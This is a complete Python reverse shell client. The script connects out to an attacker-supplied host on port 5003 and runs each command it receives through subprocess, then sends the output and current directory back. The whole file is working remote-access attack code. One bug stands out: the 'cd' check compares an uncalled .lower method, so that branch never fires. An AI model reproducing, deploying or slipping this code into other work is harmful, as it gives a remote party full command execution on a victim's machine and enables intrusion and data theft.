import socket, os, subprocess, sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128

SEPERATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current working directory and send it
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # recreive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if the operation is succesful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the results back to the server
    cwd = os.getcwd()
    message = f"{output}{SEPERATOR}{cwd}"
    s.send(message.encode())
# close client connection
s.close()
